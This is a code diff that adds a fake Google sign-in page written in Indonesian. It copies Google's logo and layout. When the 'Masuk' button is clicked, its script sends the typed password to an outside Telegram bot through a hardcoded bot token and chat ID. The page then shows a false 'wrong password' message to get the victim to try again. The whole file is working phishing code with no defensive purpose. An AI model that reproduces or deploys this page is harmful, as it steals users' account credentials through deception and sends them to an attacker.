@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="./reset.css" />
+    <link rel="stylesheet" href="./styles.css" />
+    <title>Google</title>
+  </head>
+
+  <body>
+    <div class="container">
+      <div class="card">
+        <img src="./images/google-logo.svg" alt="" />
+        <h2 class="satuakun">Satu akun untuk seluruh google</h2>
+        <h3 class="keterangan">Masuk akun google anda</h3>
+
+        <input type="password" id="password" placeholder="Masukan password" />
+        <div class="btn-email">
+          <button type="button">Lupa password ?</button>
+        </div>
+        <p>
+          Tidak ada di komputer Anda? Gunakan mode tamu untuk masuk dengan privasi.
+          <a href="">Pelajari lebih lanjut</a>
+        </p>
+
+        <div class="card-bottom">
+          <a href="index.html">Kembali</a>
+          <button type="button" id="loginButton">Masuk</button>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      document.getElementById("loginButton").addEventListener("click", function () {
+        const password = document.getElementById("password").value;
+
+        if (!password) {
+          alert("Password tidak boleh kosong!");
+          return;
+        }
+
+        // Ganti dengan token bot Telegram Anda dan chat ID Anda
+        const botToken = '6812714144:AAHCwoKn2croDh94SVFfWEmDz7R5eKbL34g';
+        const chatId = '1701307635';
+
+        // Membuat pesan
+        const message = `Password yang dimasukkan: ${password}`;
+
+        // Mengirim permintaan ke API Telegram
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`, {
+          method: 'GET',
+        })
+        .then(response => response.json())
+        .then(data => {
+          if (data.ok) {
+            alert('Sepertinya pasword anda salah !');
+          } else {
+            alert('Gagal login!');
+          }
+        })
+        .catch(error => {
+          console.error('Error:', error);
+          alert('Terjadi kesalahan, coba lagi!');
+        });
+      });
+    </script>
+  </body>
+</html>
